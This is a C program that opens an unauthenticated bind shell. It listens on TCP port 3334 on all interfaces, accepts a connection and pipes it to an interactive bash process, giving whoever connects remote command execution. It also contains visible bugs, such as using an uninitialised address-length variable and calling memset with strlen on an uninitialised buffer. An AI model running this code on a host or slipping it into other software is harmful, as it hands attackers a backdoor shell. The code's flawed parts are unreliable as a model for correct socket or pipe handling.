#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>
#include<string.h>
#include <sys/types.h>
#include<openssl/dh.h>

#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define NUM_PIPES          2

#define PARENT_WRITE_PIPE  0
#define PARENT_READ_PIPE   1

int pipes[NUM_PIPES][2];

/* always in a pipe[], pipe[0] is for read and
   pipe[1] is for write */
#define READ_FD  0
#define WRITE_FD 1

#define CHILD_WRITE_FD  ( pipes[PARENT_READ_PIPE][WRITE_FD]  )
#define PARENT_READ_FD  ( pipes[PARENT_READ_PIPE][READ_FD]   )
#define PARENT_WRITE_FD ( pipes[PARENT_WRITE_PIPE][WRITE_FD] )
#define CHILD_READ_FD   ( pipes[PARENT_WRITE_PIPE][READ_FD]  )


void error(char *msg)
{
    perror(msg);
    exit(1);
}
int main() {

  // Netowrk stuff
  int sockfd, newsockfd, portno, clilen, n;

  char sock_buffer[256];

  struct sockaddr_in serv_addr, cli_addr;
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  bzero((char *) &serv_addr, sizeof(serv_addr));
  portno = 3334;

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(portno);
  serv_addr.sin_addr.s_addr = INADDR_ANY;

  if (bind(sockfd, (struct sockaddr *) &serv_addr,
           sizeof(serv_addr)) < 0)
               error("ERROR on binding");

  listen(sockfd,5);

  printf("Waiting for connections on port: %d \n", portno);
  newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
  clilen = sizeof(cli_addr);

  bzero(sock_buffer,256);

  pipe(pipes[PARENT_READ_PIPE]);
  pipe(pipes[PARENT_WRITE_PIPE]);


  pid_t procId = fork();

  if (procId == 0 ) {
    char *argv[]={ "/bin/bash", "-i", 0};

    dup2(CHILD_READ_FD, STDIN_FILENO);
    dup2(CHILD_WRITE_FD, STDOUT_FILENO);
    execv(argv[0], argv);
  } else if (procId > 0) {
    char bash_buffer[10000];
    int file_listing;
    /* close fds not required by parent */
    close(CHILD_READ_FD);
    close(CHILD_WRITE_FD);

    fd_set rfds;
    int retval, highestFileDescriptor;

    highestFileDescriptor = PARENT_READ_FD > newsockfd ? PARENT_READ_FD : newsockfd;

    while (1) {
      FD_ZERO(&rfds);
      FD_SET(PARENT_READ_FD, &rfds);
      FD_SET(newsockfd, &rfds);

      printf("About to select\n");
      retval = select(highestFileDescriptor + 1, &rfds, NULL, NULL, NULL);
      printf("Select returned\n");
      if (retval == -1) {
        perror("error with select");
      } else if (retval) {
        if(FD_ISSET(PARENT_READ_FD, &rfds)) {
            // data is available from bash
            memset(bash_buffer,0,strlen(bash_buffer));
            file_listing = read(PARENT_READ_FD, bash_buffer, sizeof(bash_buffer)-1);
            printf("Read returned with %s\n", bash_buffer);
            if (file_listing >= 0) {
              send(newsockfd, bash_buffer,strlen(bash_buffer), 0);
              printf("sending: %s", bash_buffer);
            }
        } else {
          // data is available on socket
          n = recv(newsockfd,sock_buffer,255, 0);
          printf("finished reading\n");
          if (n > 0) {
            printf("received %s\n", sock_buffer);
          } else {
            printf("failed to read");
          }
          printf("starting to write: %s\n", sock_buffer);
          write(PARENT_WRITE_FD, sock_buffer, strlen(sock_buffer));
          if (n < 0) {
            printf("failed to write :(");
          }
          memset(sock_buffer, 0, strlen(sock_buffer));

        }
      }
    }
  } else {
    printf("failed to fork a proccess :(\n");
  }
}
